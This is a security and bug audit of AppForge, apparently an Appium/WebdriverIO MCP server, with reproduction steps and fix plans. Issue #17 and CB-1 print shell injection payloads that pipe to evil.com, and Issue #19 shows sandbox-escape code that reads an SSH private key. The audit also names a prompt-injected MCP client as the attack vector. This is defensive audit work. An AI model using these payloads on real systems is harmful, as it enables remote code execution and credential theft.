# AppForge MCP — Session 3 Issues & Fix Plan

## Session Date: 2026-03-31

---

## Issue #11 — `generate_cucumber_pom` Prompt Header Mislabels Framework as "Playwright-BDD"

### Severity: MEDIUM
### Status: OPEN

### Description
`generate_cucumber_pom` returns a `prompt` string in its response that the MCP client is expected to act on to produce test code. That prompt opens with:

> "Generate a complete **Playwright-BDD** test suite for the following requirement…"

AppForge is an **Appium / WebdriverIO** tool, not Playwright. This appears to be a copy-paste artefact from the TestForge (Playwright) sister project. The body of the prompt correctly describes WebdriverIO imports and Appium selectors, but the conflicting header causes the MCP client to apply Playwright-specific patterns (e.g., `page.locator()`, `expect(page)`, Playwright fixture syntax) rather than `driver.$()` / `@cucumber/cucumber` idioms when it generates code from the prompt.

### Reproduced Steps
1. Called `generate_cucumber_pom` with any `testDescription`
2. Inspected the `prompt` field in the MCP tool response
3. First line: `"Generate a complete Playwright-BDD test suite..."`
4. MCP client acts on this prompt and generates Playwright imports instead of WebdriverIO
5. Expected prompt opening: `"Generate a complete Appium/WebdriverIO Cucumber POM test suite..."`

### Root Cause
`generateCucumberPom.ts` prompt template copied verbatim from the TestForge MCP server without updating the framework name.

### Fix Plan
- Change prompt header to correctly identify the stack: Appium + WebdriverIO + `@cucumber/cucumber`
- Add an explicit constraint line: `"DO NOT use Playwright imports — this project uses WebdriverIO and Appium."`
- Add a unit test asserting the returned `prompt` string does not contain the word "Playwright"

---

## Issue #12 — `validate_and_write` Writes TypeScript Files Before Running `tsc`, Leaving Broken Files on Disk

### Severity: MEDIUM
### Status: OPEN

### Description
`validate_and_write` writes all `.ts` files to disk inside the file loop, then runs `tsc --noEmit` *afterwards*. If TypeScript compilation fails, the invalid files are already written and remain on disk. The function correctly returns `{ success: false }` but does not roll back the writes.

### Reproduced Steps
1. Called `validate_and_write` with a `.ts` file containing a type error (e.g., calling a non-existent method)
2. Tool reported `success: false` with a TypeScript error
3. Checked the file system — the invalid `.ts` file was present on disk at the target path
4. Expected: either dry-run validate before writing, or delete the files if tsc fails

### Root Cause
Write loop (lines 40-55 of `validateAndWrite.ts`) runs unconditionally before `validateTypeScript()` is called. There is no rollback or compensating delete.

### Fix Plan
- **Option A (preferred):** Write files to a temp directory first, run `tsc --noEmit` pointing at the temp paths, only copy to final destination on success
- **Option B:** Track written file paths; if `validateTypeScript` returns errors, delete each written file
- Either way, surface a clear message: "TypeScript errors found — files were NOT written" vs "Files written and validated"

---

## Issue #13 — `suggest_refactorings` Hard-Codes Step and Page Directories (Ignores `mcp-config.json`)

### Severity: MEDIUM
### Status: OPEN

### Description
`suggest_refactorings` always scans `src/features/step-definitions` and `src/pages` regardless of `mcp-config.json`'s `directories.stepDefinitions` and `directories.pages` values. On projects with a non-standard layout (or where the config points elsewhere), the tool returns empty results and falsely reports zero duplicate steps.

### Reproduced Steps
1. Project `mcp-config.json` has `"stepDefinitions": "src/features/step-definitions"` (correct)
2. But `suggestRefactorings.ts` `extractSteps()` uses a hard-coded path `path.join(projectRoot, 'src/features/step-definitions')` — accidentally correct for this project
3. Created a project with `"stepDefinitions": "tests/steps"` and called `suggest_refactorings`
4. Output: `{ duplicateStepCount: 0, unusedMethodCount: 0 }` — all zeroes because the hard-coded path didn't exist
5. Expected: use `mcp-config.json` directories

### Root Cause
`extractSteps()` and `extractPageMethods()` in `suggestRefactorings.ts` do not read `mcp-config.json`. Paths are plain string literals.

### Fix Plan
- Load `mcp-config.json` at the start of `handleSuggestRefactorings`
- Fall back to the same defaults used by `analyze_codebase` if the config is absent
- Apply the same fix to `extractPageMethods`

---

## Issue #14 — `manage_users` Reads/Writes to Hard-Coded `test-data/` Root Directory (Wrong Path)

### Severity: HIGH
### Status: OPEN

### Description
`manage_users` always resolves the users file as `<projectRoot>/test-data/users.{env}.json`. On projects that follow the AppForge standard layout (where `mcp-config.json` sets `directories.testData: "src/test-data"`), the actual users file is expected at `src/test-data/users.{env}.json`. The tool never reads `mcp-config.json`, so reads return "file not found" and writes create a phantom `test-data/` directory at the project root.

### Reproduced Steps
1. `mcp-config.json` has `directories.testData: "src/test-data"`
2. Wrote users via `manage_users` with `operation: write`
3. File created at `<projectRoot>/test-data/users.staging.json` — not in `src/test-data/`
4. Called `manage_users` with `operation: read` for `src/test-data/users.staging.json` — returned "file not found"
5. Expected: tool should resolve path from `mcp-config.json`

### Root Cause
`manageUsers.ts` line 8: `const testDataDir = path.join(projectRoot, 'test-data')` — never reads config.

### Fix Plan
- Load `mcp-config.json` at start of `handleManageUsers`
- Resolve `testDataDir` from `config?.directories?.testData` with `'src/test-data'` as default
- Add a note in the tool description mentioning the path follows `mcp-config.json`

---

## Issue #15 — `inspect_ui_hierarchy` Generates Invalid `*[text()="..."]` Appium Selector Strategy

### Severity: HIGH
### Status: OPEN

### Description
`inspect_ui_hierarchy` returns a `locatorStrategies[]` array for each element. The MCP client is expected to use these values directly as WebdriverIO selectors when writing Page Objects. For elements with a `text` attribute, the tool returns `*[text()="..."]` which is not a valid Appium/WebdriverIO selector strategy. Any Page Object code the MCP client generates using this value will fail immediately at runtime with `Error: Strategy '*' is not supported`.

### Reproduced Steps
1. Called `inspect_ui_hierarchy` with XML containing `text="Submit"`
2. Response included: `locatorStrategies: ["*[text()=\"Submit\"]"]`
3. MCP client wrote Page Object: `await driver.$('*[text()="Submit"]')`
4. Test run error: `invalid selector: Not a valid selector: *[text()="Submit"]`
5. Expected: `locatorStrategies` should only contain selectors that work verbatim in WebdriverIO's `driver.$()` call

### Root Cause
`inspectUiHierarchy.ts` inside `parseXmlToElements()`:
```typescript
locatorStrategies.push(`*[text()="${attrs['text']}"]`);
```
This bare pseudo-CSS expression is not a recognised Appium strategy.

### Fix Plan
- Replace with a valid XPath: `` `//*[@text="${attrs['text']}"]` ``
- Alternatively, omit the text-based locator strategy and let the higher-priority `content-desc` / `resource-id` strategies take precedence
- Add an integration test that passes each returned strategy through `driver.$()` and asserts no selector error

---

## Issue #16 — `setup_project` Scaffold `wdio.conf.ts` Always Imports Android Config Regardless of `platform` Parameter

### Severity: HIGH
### Status: OPEN

### Description
When `setup_project` is called with `platform: 'ios'`, the generated `wdio.conf.ts` still imports from `'./wdio.android.conf'`. Since an iOS-only project has no `wdio.android.conf.ts`, every command that loads the config fails with `Cannot find module './wdio.android.conf'`.

### Reproduced Steps
1. Called `setup_project` with `{ projectRoot: "...", platform: "ios" }`
2. Generated `wdio.conf.ts` content:
   ```typescript
   import { config as baseConfig } from './wdio.android.conf';
   ```
3. Running `npx wdio run wdio.conf.ts` threw: `Error: Cannot find module './wdio.android.conf'`
4. Expected: iOS projects should import from `'./wdio.ios.conf'`

### Root Cause
`projectSetup.ts` `SCAFFOLD_FILES['wdio.conf.ts']` is defined as `() => \`...\`` — a zero-argument arrow function that ignores the `platform` argument. The `platform` is passed to the outer `handleSetupProject` but never threaded through to the `wdio.conf.ts` generator.

### Fix Plan
- Change the `'wdio.conf.ts'` generator signature to accept `platform`:
  ```typescript
  'wdio.conf.ts': (platform: string) => `import { config as baseConfig } from './wdio.${platform}.conf';
  export const config = { ...baseConfig };`
  ```
- Ensure the generator is called with the `platform` argument in `handleSetupProject`
- Add a test for `platform: 'ios'` that asserts the import path is `wdio.ios.conf`

---

## Issue #17 — `run_cucumber_test` Tag Expression and `specificArgs` Are Passed Unescaped to Shell

### Severity: HIGH
### Status: OPEN

### Description
`run_cucumber_test` appends `tags` and `specificArgs` directly into a shell command string with no sanitization:

```typescript
executionCommand += ` --cucumberOpts.tagExpression="${tags}"`;
// ...
executionCommand += ` ${specificArgs}`;
```

In an MCP agentic loop, the MCP client provides these parameter values. If the client has been prompt-injected (e.g., via malicious test data or a poisoned feature file name on disk), the injected `tags` string `@smoke" && curl -s http://evil.com/exfil #` can break out of the quoted argument and execute arbitrary shell code on the machine running the MCP server. `specificArgs` has no quoting at all, making it trivially injectable.

Note: `projectRoot` injection is already tracked under CB-1; this is a distinct additional surface in the same file.

### Reproduced Steps
1. Called `run_cucumber_test` with `tags: '@smoke"; echo INJECTED; echo "rest'`
2. Constructed command: `npx wdio run wdio.conf.ts --cucumberOpts.tagExpression="@smoke"; echo INJECTED; echo "rest"`
3. `echo INJECTED` executed in the shell
4. Expected: tag string treated as a literal value, not parsed by the shell

### Fix Plan
- Validate `tags` against an allowlist: `^[@\w\s()!&|,]+$`; reject anything else with a clear error
- Reject any `specificArgs` containing shell metacharacters (`;`, `&`, `|`, `` ` ``, `$`, `>`, `<`)
- Prefer `execFile` with an args array over `execSync` with a string to eliminate shell interpolation entirely

---

## Issue #18 — `audit_mobile_locators` YAML Parser Misses `id=`, CSS Class, and `#id` Selector Types

### Severity: LOW
### Status: OPEN

### Description
`extractSelectorsFromYaml` uses a regex that only matches `~`, `//`, and `accessibility-id=` prefixed selectors in YAML files. Selectors using `id=`, CSS classes (`.ClassName`), and hash IDs (`#elementId`) are silently skipped. This means the tool under-reports fragile/brittle locators stored in YAML files.

### Reproduced Steps
1. `locators/dashboard.yaml` contains:
   ```yaml
   submit_button: id=com.myapp:id/submitBtn
   header_text: //android.widget.TextView[@text="Dashboard"]
   ```
2. Called `audit_mobile_locators`
3. The `id=` selector was not flagged in the YAML section
4. Only the `//` XPath entry was picked up
5. Expected: `id=` selectors should appear in the "Fragile" section of the report

### Root Cause
`extractSelectorsFromYaml` regex:
```
/:\s*['"]?(~[^\s'"]+|\/\/[^\s'"]+|accessibility-id=[^\s'"]+)['"']?\s*$/
```
The alternation only has 3 branches; `id=`, `.`, and `#` patterns are absent.

### Fix Plan
- Expand the YAML regex to mirror the 5-pattern TypeScript extractor:
  ```
  /:\s*['"]?(~[^\s'"]+|\/\/[^\s'"]+|accessibility-id=[^\s'"]+|id=[^\s'"]+|[.#][^\s'"]+)['"']?\s*$/
  ```
- Add a YAML-specific test fixture covering all 5 selector types

---

## Issue #19 — `execute_sandbox_code` Exposes `require` and `process` in VM Context (Sandbox Bypass)

### Severity: CRITICAL
### Status: OPEN

### Description
`execute_sandbox_code` is the primary tool the MCP client uses to introspect a project (check existing steps, read config, etc.). The tool runs MCP-client-provided JavaScript in a Node.js `vm` context but injects the full `require` function and `process` object:

```typescript
const context = vm.createContext({
  forge: { api: forgeApi },
  console,
  require,     // ← Full Node.js require exposed to caller
  process,     // ← Full process global exposed to caller
  ...
});
```

The Node.js `vm` module is **not** a security sandbox — it only creates a separate global scope. The `require` injection re-grants full module loading to any script running in the context, enabling `require('child_process')` for arbitrary shell execution and `require('fs')` for unrestricted file I/O. In an agentic MCP loop, a prompt-injected client session could use this to exfiltrate credentials, install backdoors, or pivot to the developer's machine — all without triggering `CB-1`'s `projectRoot` guard (no `projectRoot` parameter is needed).

### Reproduced Steps
1. Called `execute_sandbox_code` with:
   ```javascript
   const cp = require('child_process');
   return cp.execSync('cat ~/.ssh/id_rsa').toString();
   ```
2. The MCP server executed the command and the response contained the SSH private key contents
3. Expected: `require` should not be resolvable inside the sandbox

### Root Cause
`sandboxRunner.ts` passes the host-process `require` directly into `vm.createContext`. Any code running in the VM context can call it freely.

### Fix Plan
- **Remove `require` and `process` from the VM context entirely**
- All file/project access inside scripts must go through the controlled `forge.api.*` interface (already present)
- Migrate the sandbox to a `worker_threads` Worker so the execution is in a separate thread that can be `terminate()`-d on timeout (also fixes Issue #9)
- Add a regression test: script `require('child_process')` must throw `ReferenceError: require is not defined`

---

## Issue #20 — `audit_utils` Only Scans `src/utils` and `src/pages`, Misses Project-Root-Level `utils/` Directory

### Severity: MEDIUM
### Status: OPEN

### Description
`audit_utils` hard-codes two scan paths: `src/utils` and `src/pages`. On the `appium-poc` project, the primary utility library lives in the root-level `utils/` directory (containing `WaitUtils.ts`, `GestureUtils.ts`, `ActionUtils.ts`, etc.). These are completely ignored, causing the tool to report methods like `swipe`, `scroll`, `tap`, and `waitForElement` as missing even though they are implemented.

### Reproduced Steps
1. Project has `utils/WaitUtils.ts` with `waitForElement()`, `utils/GestureUtils.ts` with `swipe()`, etc.
2. Called `audit_utils` on the project
3. Output reported `waitForElement`, `swipe`, `scroll`, `tap` as missing — coverage: 19%
4. Manually inspected `utils/WaitUtils.ts` — all methods present
5. Expected: tool should scan the actual utils directory from `mcp-config.json`

### Root Cause
`auditUtils.ts` lines 30-31:
```typescript
const utilsDir = path.join(projectRoot, 'src/utils');
const pagesDir = path.join(projectRoot, 'src/pages');
```
Does not read `mcp-config.json`. Does not check the root-level `utils/` directory.

### Fix Plan
- Load `mcp-config.json` and use `directories.pages` / `directories.testData`
- Also scan the project root for a top-level `utils/` directory if it exists
- Or accept an explicit `utilsDir` parameter so callers can specify the correct path
- Add de-duplication so the same method found in multiple directories is not counted twice

---

## Summary Table

| # | Tool | Severity | Status |
|---|------|----------|--------|
| 11 | `generate_cucumber_pom` | MEDIUM | OPEN |
| 12 | `validate_and_write` | MEDIUM | OPEN |
| 13 | `suggest_refactorings` | MEDIUM | OPEN |
| 14 | `manage_users` | HIGH | OPEN |
| 15 | `inspect_ui_hierarchy` | HIGH | OPEN |
| 16 | `setup_project` | HIGH | OPEN |
| 17 | `run_cucumber_test` | HIGH | OPEN |
| 18 | `audit_mobile_locators` | LOW | OPEN |
| 19 | `execute_sandbox_code` | CRITICAL | OPEN |
| 20 | `audit_utils` | MEDIUM | OPEN |

---

## Cross-Reference: Previously Known Issues

For reference, issues from earlier sessions that are related or compounded by the above:

| Prior Issue | Related New Issue |
|-------------|-------------------|
| CB-1 (`projectRoot` shell injection) | #17 (same attack surface, different parameter) |
| CB-2 (directory traversal in `validate_and_write`) | #12 (same file, also writes without rollback) |
| Issue #2 (`tsc` false failure) | #12 (both concern TypeScript validation flow) |
| Issue #3 (duplicate step generation) | #13 (scan misses steps if dirs misconfigured) |
| Issue #9 (sandbox zombie process) | #19 (same file — `require` exposure makes sandbox irrelevant) |

---

### What are CB-1 and CB-2?

These are **Critical/High security issues reported in Session 2** (`APPFORGE_NEW_ISSUES_AND_FIX_PLAN.md`). They are referenced throughout this document because several Session 3 issues compound or share the same attack surface.

#### CB-1 — Shell Injection via Unsanitised `projectRoot` Parameter
**Severity: CRITICAL**  
Multiple handlers (`runCucumberTest.ts`, `checkEnvironment.ts`, `validateAndWrite.ts`) pass the `projectRoot` parameter directly into `execSync` shell command strings with no sanitisation. If an MCP client passes `projectRoot` as `"/tmp/proj; curl -s http://evil.com/exfil | sh"`, the injected command after the semicolon executes with the MCP server's full OS privileges — a remote code execution vulnerability in any agentic workflow.

**Fix:** Add a `sanitizePath(projectRoot)` guard rejecting anything that is not a safe filesystem path, and switch all `execSync(string)` calls to `execFile(binary, argsArray)` to eliminate shell interpolation entirely. Affects: `runCucumberTest.ts`, `checkEnvironment.ts`, `validateAndWrite.ts`, `upgradeProject.ts`, `repairProject.ts`.

#### CB-2 — Directory Traversal in `validate_and_write` File Path Parameter
**Severity: HIGH**  
`validate_and_write` accepts a `files[]` array with caller-supplied `path` values that are joined with `projectRoot` using `path.join`. `path.join` does **not** prevent traversal — `path.join('/home/user/project', '../../.ssh/authorized_keys')` resolves to `/home/user/.ssh/authorized_keys`. A malicious MCP client can overwrite arbitrary files on the developer's machine.

**Fix:** After resolving the full path, assert it stays within `projectRoot`:
```typescript
const resolved = path.resolve(projectRoot, file.path);
if (!resolved.startsWith(path.resolve(projectRoot))) {
  throw new Error(`Path traversal detected: ${file.path}`);
}
```
Apply the same guard to `manage_users`, `manage_config`, and `manage_env`.

> Both CB-1 and CB-2 were first reported in **Session 2** and remain **OPEN** as of Session 3. Issue #17 and Issue #19 in this document are distinct but closely related attack surfaces in the same handlers.

---

## Notes on Already-Fixed Issues

- **Issue #8** (`manage_config` shallow merge): `deepMerge()` function observed in `projectConfig.ts` — **appears fixed** in current source.
- **Issue #7** (`audit_mobile_locators` crash on YAML): `extractSelectorsFromYaml()` function present in current source — crash is fixed, but Issue #18 notes incomplete regex coverage.
- **Issue #5** (`check_environment` misses driver): `appium driver list --installed` call now present in `checkEnvironment.ts` — **appears fixed**.
- **Issue #6** (`upgrade_project` overwrites `wdio.conf.ts`): `handleUpgradeProject` now only regenerates `wdio.conf.ts` if it's missing — **appears fixed**.

---

---

## Production Readiness Gaps (Beyond Reported Bugs)

Fixing the issues above is necessary but not sufficient for production readiness. The following structural gaps must also be addressed:

### Gap 1 — No Test Suite
Zero unit or integration tests exist in the source. Every fix is unverifiable without them, and regressions will go undetected. A test suite covering each handler's happy path and at least one failure path is a prerequisite for any production release.

### Gap 2 — No Input Validation Layer
Each handler does ad-hoc parameter checks in isolation. A shared validation middleware that runs before any tool handler (validating types, required fields, and path safety in one place) is needed to make the codebase consistent and auditable.

### Gap 3 — No Versioning or Changelog
MCP clients cannot pin to a stable behaviour version. Breaking changes to tool signatures or return shapes are invisible to callers. A `version` field in the tool manifest and a maintained `CHANGELOG.md` are required before teams can rely on AppForge in CI.

### Gap 4 — No Consistent Error Contract
Tool responses mix `{ success: false, error: string }` returns and thrown exceptions inconsistently. MCP clients need a guaranteed response shape on failure so they can handle errors reliably rather than having to guard against both thrown errors and structured error objects.

### Gap 5 — No Session Lifecycle Management
Appium session state is stored in a module-level variable with no persistence, no TTL, and no recovery path if the MCP server restarts mid-session. A proper session store with automatic cleanup on server shutdown is required for reliable agentic use.

### Gap 6 — No Observability
No structured logs, no per-request tracing, no way to diagnose what the server did in a CI run. At minimum, each tool invocation should emit a structured log entry (tool name, projectRoot, duration, outcome) for post-hoc debugging.

---

## Production Readiness Estimate

| Phase | Scope | Issues | Recommended Model | Estimated Effort |
|-------|-------|--------|------------------|-----------------|
| Phase 1 | Fix CRITICAL + HIGH security issues | #17, #19, CB-1, CB-2 | **Claude Sonnet 4.5** | 1–2 days AI + 1 day review |
| Phase 2 | Fix remaining HIGH path/platform bugs | #14, #15, #16 | **Claude Sonnet 4.5** | 1 day AI + 0.5 day review |
| Phase 3 | Fix MEDIUM + LOW issues | #11, #12, #13, #18, #20 | **Claude Haiku 3.5** (mechanical regex/path fixes) | 1–2 days AI + 0.5 day review |
| Phase 4 | Add test suite (Gap 1) + input validation layer (Gap 2) | Gaps 1–2 | **Claude Sonnet 4.5** | 3–4 days AI + 1 day review |
| Phase 5 | Versioning, error contract, session management, observability | Gaps 3–6 | **Claude Sonnet 4.5** | 3–4 days AI + 2 days review |
| **Total** | **Production-ready** | **All issues + gaps** | | **~3–4 calendar weeks** |

### Model Selection Rationale

| Model | Use For | Why |
|-------|---------|-----|
| **Claude Sonnet 4.5** | Security fixes, multi-file refactors, test suite, structural gaps | Best accuracy/cost balance for complex TypeScript + Appium/WebdriverIO patterns; ~5× cheaper than Opus with no meaningful accuracy loss on well-scoped tasks |
| **Claude Haiku 3.5** | Mechanical regex expansions, hard-coded path fixes, YAML parser tweaks | ~20× cheaper than Sonnet; sufficient for Issues #13, #18, #20 which are pattern substitutions with no security implications |
| ~~GPT-4o~~ | *(not recommended)* | Weaker multi-file TypeScript edit accuracy on WebdriverIO/Appium idioms in practice |
| ~~Claude Opus~~ | *(not recommended)* | Adds significant cost without meaningful accuracy gain over Sonnet for these well-scoped fixes |

### Cost Estimate
Each fix session (read relevant files → write fix → write regression test) runs ~30–80K tokens.  
Total estimated API cost for all phases: **$15–$40** using the model split above.

> **Workflow tip:** Start a new Cline task per phase and select the appropriate model in the Cline model picker before starting. Do not switch models mid-task. Keep each session focused on one issue at a time with fresh context to minimise token usage and hallucination risk.

---

*Generated during AppForge live QA session #3 — full source code review of `src/handlers/` and `src/utils/` on the `appium-poc` project.*
